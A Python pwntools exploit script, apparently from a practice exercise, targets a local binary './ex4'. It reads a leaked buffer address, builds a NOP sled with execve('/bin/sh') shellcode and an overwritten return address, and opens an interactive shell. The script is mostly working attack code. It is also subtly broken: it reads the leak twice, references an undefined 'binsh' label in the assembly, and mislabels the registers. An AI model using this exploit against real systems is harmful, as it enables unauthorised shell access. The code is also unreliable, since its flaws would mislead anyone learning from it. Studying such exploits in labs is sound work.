#!/usr/bin/env python3

from pwn import *

# Set the architecture and OS for asm()
context.update(arch='amd64', os='linux')

# Start the target process
target = process("./ex4")

# Receive the leaked buffer address from the target
leak = target.recvline().strip()
print(f"Leaked buffer address: {leak}")

# Receive the leaked buffer address from the target
leak = target.recvline().strip().decode('utf-8')  # Decode the byte string to a regular string
print(f"Leaked buffer address: {leak}")
# Convert the leaked address from hex string to integer
buffer_address = int(leak, 16)

# Shellcode to execute execve("/bin/sh", NULL, NULL)
# Prepare the shellcode
shellcode = asm('''
    xor rdi, rdi                  # Clear rdi to NULL (argv)
    xor rsi, rsi                  # Clear rsi to NULL (envp)
    lea rdi, [rel binsh]          # Load effective address of '/bin/sh' into rdi
    mov rax, 59                   # syscall number for execve
    syscall                        # Make the syscall
''')

# Define the string '/bin/sh' that we will use in the payload
binsh = b'/bin/sh\x00'  # Null-terminated string

# Create the payload
nop_sled = b'\x90' * (256 - len(shellcode) - len(binsh))  # NOP sled before the shellcode
payload = nop_sled + shellcode + binsh + p64(buffer_address)  # Append the address to overwrite the return address

# Print disassembly of the shellcode for verification
print(f"Disassembly of shellcode:\n{disasm(shellcode)}")
print(f"Payload length: {len(payload)}")

# Auto-crafted and hand-crafted examples
craft_payload = asm(shellcraft.amd64.mov("rdi", u64(b"/bin/cat")))
hand_payload = asm(f"mov rdi, {u64(b'/bin/cat')}")

# Print disassembled auto-crafted and hand-crafted payloads
print(f"AUTO-CRAFTED:\n{disasm(craft_payload)}")
print(f"HAND-CRAFTED:\n{disasm(hand_payload)}")

# Demonstrate manual assembly for different operations
manual = asm("mov rdi, 10")
manual += asm("xor rdi, 1")
print(f"MANUAL:\n{disasm(manual)}")

# Send the crafted payload to the target
target.send(payload)

# Drop to interactive mode to use the shell
target.interactive()
